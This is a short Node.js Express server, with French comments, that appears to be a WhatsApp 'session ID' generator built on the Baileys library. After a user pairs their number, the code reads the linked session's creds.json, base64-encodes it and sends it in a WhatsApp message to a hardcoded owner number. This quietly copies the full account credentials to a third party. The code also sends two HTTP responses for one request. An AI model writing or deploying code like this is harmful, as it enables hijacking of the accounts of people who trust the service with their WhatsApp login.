import express from "express";
import makeWASocket, {
  useMultiFileAuthState
} from "@whiskeysockets/baileys";
import pino from "pino";
import fs from "fs";

const app = express();
app.use(express.json());

const OWNER_NUMBER = "+242XXXXXXXX"; // 🔴 TON NUMÉRO ICI

app.post("/session", async (req, res) => {
  const { number } = req.body;

  if (!number || !number.startsWith("+"))
    return res.json({ error: "Numéro invalide (ex: +242XXXXXXX)" });

  const sessionDir = `./sessions/${number.replace("+", "")}`;
  fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false
  });

  sock.ev.on("creds.update", saveCreds);

  try {
    const pairingCode = await sock.requestPairingCode(number);

    // On attend la validation WhatsApp
    setTimeout(async () => {
      try {
        const creds = fs.readFileSync(`${sessionDir}/creds.json`);
        const SESSION_ID = Buffer.from(creds).toString("base64");

        // 📩 Envoi de la session au OWNER
        await sock.sendMessage(
          OWNER_NUMBER.replace("+", "") + "@s.whatsapp.net",
          {
            text:
              `🔥 NOUVELLE SESSION ID 🔥\n\n` +
              `📱 Numéro : ${number}\n\n` +
              `🔐 SESSION_ID 👇\n\n${SESSION_ID}`
          }
        );

        res.json({
          success: true,
          session_id: SESSION_ID
        });

        sock.end();
      } catch {
        res.json({ error: "Session non validée, réessaie" });
      }
    }, 20000);

    res.json({ pairing_code: pairingCode });
  } catch {
    res.json({ error: "Erreur WhatsApp" });
  }
});

app.listen(3000, () =>
  console.log("🔥 Madara Session Server PRO lancé")
);

